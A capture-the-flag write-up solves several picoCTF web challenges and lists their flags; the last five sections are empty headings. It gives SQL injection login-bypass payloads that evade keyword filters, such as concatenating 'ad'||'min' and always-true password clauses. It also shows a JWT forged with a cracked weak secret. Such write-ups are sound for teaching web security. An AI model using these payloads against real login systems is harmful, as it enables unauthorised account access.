# Challenges   

<br>

## A. <a href = "https://play.picoctf.org/practice/challenge/88">Web Gauntlet</a>

<pre>
A login page is given along with a page filter.php. 
When any username and password are entered, a SQL query appears in the background of the page. 
Our aim is to take admin access for which username must be <b>admin</b>. 
This is indeed a SQL injection problem.
</pre>

* #### Round 1
  **Filter used -** ```or```    
    
  ```sql
  SELECT * FROM users WHERE username='admin' AND password='admin'
  ```     
  when username and password are **admin**.    
  
  We need the query to be    
  ```sql
  SELECT * FROM users WHERE username='admin';
  ```    
  
  For this we can enter the username as  
  ```admin'--``` or ```admin'/*``` or ```admin';```.    
  
  ```--``` and ```/*``` comments the rest of query while ```;``` ends it.

* #### Round 2
  **Filter used -** ```or and like = --```

  we can enter the username as  
  ```admin'/*``` or ```admin';``` again.    

* #### Round 3
  **Filter used -** ```or and = like > < --```     

  we can enter the username as  
  ```admin'/*``` or ```admin';``` again.
   
* #### Round 4
  **Filter used -** ```or and = like > < -- admin```

  This one is a tricky one as now the word **admin** has been filtered.
  We need to find a way so that we can enter the word **admin**.
  One way is to make **admin** as concatenation of 2 strings, let **ad**
  and **min** but i tried many combinations like ```'ad'+'min'```, using ```concat()```,
  using ```union``` but they didn't seem to work.
  Finally ```ad'||'min';``` worked which uses ```||``` as concatenation.
   
* #### Round 5
  **Filter used -** ```or and = like > < -- union admin```

  Since filter does not block the last username, it will still work.
  Enter ```ad'||'min';```     

  *filter.php* gives the flag ***picoCTF{y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5}***     

<br>   

## B. <a href = 'https://play.picoctf.org/practice/challenge/174'>Web Gauntlet 2</a>   
<pre>
A similar login page and a page filter.php are given.
</pre>
**Filter used -** ```or and true false union like = > < ; -- /* */ admin```   
Username can be taken as ```ad'||'min``` but since there is no way to end the query,
we need to find a way to make the password *true*.    
One such way is to use ```is not``` which returns true.    
The password can be taken as ```1' is not '2```.     
The query becomes :    
```sql
SELECT username, password FROM users WHERE username='ad'||'min' AND password='1' is not '2'
```    

It works and *filter.php* gives the flag ***picoCTF{0n3_m0r3_t1m3_e2db86ae880862ad471aa4c93343b2bf}***     

<br>

## C. <a href = "https://play.picoctf.org/practice/challenge/128">Web Gauntlet 3</a>
<pre>
Again similar login page and a page filter.php are given. Since no new filter is added, username and password
from previous problem works fine.
</pre>
**Filter used -** ```or and true false union like = > < ; -- /* */ admin```      

username - ```ad'||'min```      
password - ```1' is not '2```        

The query becomes :    
```sql
SELECT username, password FROM users WHERE username='ad'||'min' AND password='1' is not '2'
```    

It works and *filter.php* gives the flag ***picoCTF{k3ep_1t_sh0rt_6fdd78c92c7f26a10acd3ece176dea4d}***   

<br>

## D. <a href = "https://play.picoctf.org/practice/challenge/80">Irish-Name-Repo 1</a>   
<pre>
A <a href = "https://jupiter.challenges.picoctf.org/problem/39720/">webpage</a> is given with a login page.   
It also seems to be a SQL injection problem.
</pre>
Trying **admin** as username and password gives login failed.   
The query should be like - 
```sql
SELECT * FROM users WHERE username='admin';
```     
Trying a simple injection ```admin';``` reveals the flag ***picoCTF{s0m3_SQL_c218b685}***.    

<br> 
  
## E. <a href = "https://play.picoctf.org/practice/challenge/59">Irish-Name-Repo 2</a>   
<pre>
A similar <a href = "https://jupiter.challenges.picoctf.org/problem/52849/">webpage</a> is given with a login page.   
</pre>
Trying **admin** as username and password gives login failed.     
Trying as previous one ```admin';``` reveals the flag ***picoCTF{m0R3_SQL_plz_fa983901}***.    

<br>   

## F. <a href = "https://play.picoctf.org/practice/challenge/8">Irish-Name-Repo 3</a>   
<pre>
A similar <a href = "https://jupiter.challenges.picoctf.org/problem/29132/">webpage</a> is given with a login page.   
</pre>
This time only password box is given. Trying **admin** has password gives login failed.  
On viewing the source code of the page we can see a tag named **debug** set to 0,   
On turning it to 1, we can see the actual query.
```sql
SELECT * FROM admin where password = 'nqzva'
```
The input **admin** changed to **nqzva**, there must be some encryption here.     
But we can avoid decoding the encryption because we just have to make the password *true*.     
We can do this by ```!=```.       
Entering password ```1' != '2``` reveals the flag ***picoCTF{3v3n_m0r3_SQL_06a9db19}***.     

<br> 

## G. <a href = "https://play.picoctf.org/practice/challenge/25">JaWT Scratchpad</a> 
<pre>
A <a href = "https://jupiter.challenges.picoctf.org/problem/61864/">link</a> to a webpage is given.
The webpage is a scratchpad, which says 
<i>You will need to log in to access the JaWT scratchpad.You can use any name, other than admin... 
because the admin user gets a special scratchpad!</i>
So, we need to take admin access. We are also given 2 other links, <a href="https://jwt.io/">JWT</a> and <a href="https://github.com/magnumripper/JohnTheRipper">John</a>,
to a JSON Web Tokens decoder and john the ripper. This indicates we might have to use john the ripper and
the JWT decoder.

On entering a username as <b>admin</b>, the following message is displayed - 

<i>YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.</i>

On entering a different username,a cookie named jwt is created, it can seen using an extension or dev tools,
the cookie contains which looks like base64 data. Decoding the string gives a JSON.
Which gives the hint that it might need to be decoded from given link.
</pre>
<pre>
For username <i><b>loki</b></i> the token was
<i>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibG9raSJ9.xaY3VU6pL90moR9d5iywyquMo3dimZkAKCR5YPsYTLY</i>
</pre>     

**Header**     

> {"typ": "JWT","alg": "HS256"}       
    
**Payload**

> {"user": "loki"}

<pre>
The website generates another token when <i>user</i> is changed to <i><b>admin</b></i>.
The new token is 
<i><b>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-vh-85mhRjMzTUsaJEWhgJwu-_EzDOy8zI0a9dik2Ww</b></i>
But it is incorrect as its signature is a random string and not the secret key used by the author.
We need to find this secret key by using john.
</pre>
The algorithm is HS256. 
</pre>
<pre>
The secret key is <i><b>ilovepico</b></i>
The token is 
<i><b>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s</b></i>
Pasting this token in cookie reveals the flag <i><b>picoCTF{jawt_was_just_what_you_thought_1ca14548}</b></i>
</pre>    

<br>   

## H. <a href = "https://play.picoctf.org/practice/challenge/296">Secrets</a> 
<pre>
It is given that several pages are hidden. An instance is given and on running it a webpage opens.
ON inspecting it can be found that the source of the directory is the folder <b><i>secret</i></b>.
</pre> 
On changing the path to ```/secret``` it says _You almost found me_.     
Upon inspect, the source has a further folder named ***hidden***,     
changing the path to ```/secret/hidden```,
another folder is found named **_superhidden_**      
changing the path to ```/secret/hidden/superhidden```
Source code of _superhidden_ page reveals the flag  


## I. <a href = "https://play.picoctf.org/practice/challenge/8?page=1&search=irish">Client-side-again</a> 
<pre>
 
</pre>

## J. <a href = "https://play.picoctf.org/practice/challenge/8?page=1&search=irish">Who are you?</a> 
<pre>
 
</pre>

## K. <a href = "https://play.picoctf.org/practice/challenge/8?page=1&search=irish">IntroToBurp</a> 
<pre>
 
</pre>

## L. <a href = "https://play.picoctf.org/practice/challenge/8?page=1&search=irish">Java Script Kiddie </a> 
<pre>
 
</pre>

## M. <a href = "https://play.picoctf.org/practice/challenge/8?page=1&search=irish">Java Script Kiddie 2</a> 
<pre>
 
</pre>
